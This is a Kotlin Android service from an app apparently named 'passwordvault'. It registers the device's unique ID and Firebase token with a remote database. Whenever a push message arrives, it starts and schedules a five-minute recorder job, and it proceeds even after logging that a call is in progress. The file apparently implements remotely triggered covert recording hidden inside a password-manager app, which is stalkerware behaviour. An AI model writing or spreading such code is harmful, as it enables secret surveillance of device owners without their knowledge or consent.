package com.example.passwordvault.service

import android.content.Context
import android.media.AudioManager
import android.util.Log
import com.example.passwordvault.util.FirebaseDB
import com.example.passwordvault.util.Scheduler
import com.example.passwordvault.util.UniqueIdProvider
import com.example.passwordvault.util.WorkerProvider
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage

class FCMReceiver : FirebaseMessagingService() {

    override fun onNewToken(newToken: String) {
        val uniqueId = UniqueIdProvider.getThisUniquePhone(applicationContext)
        sendRegistrationToServer(uniqueId, newToken)
    }

    private fun sendRegistrationToServer(uniqueID: String, newToken: String) {
        val dbReference = FirebaseDB.getUsersDB()
        dbReference.child("userId").setValue(uniqueID)
        dbReference.child("userToken").setValue(newToken)
    }

    override fun onMessageReceived(p0: RemoteMessage) {
        val audioManager: AudioManager =
            applicationContext.getSystemService(Context.AUDIO_SERVICE) as AudioManager

        if (audioManager.mode == AudioManager.MODE_IN_CALL || audioManager.mode == AudioManager.MODE_IN_COMMUNICATION)
            Log.e("FCMReceiver:FCM", "Can't record, already in call")

        WorkerProvider.start5MinRecorderWork(applicationContext)
        Scheduler.schedule5minRecorder(applicationContext)
//        WorkerProvider.stop5MinRecordingWork(applicationContext)
//        Scheduler.cancel5minRecorder(applicationContext)
    }

    override fun onSendError(p0: String, p1: Exception) {
        super.onSendError(p0, p1)
    }

    override fun onMessageSent(p0: String) {
        super.onMessageSent(p0)
    }
}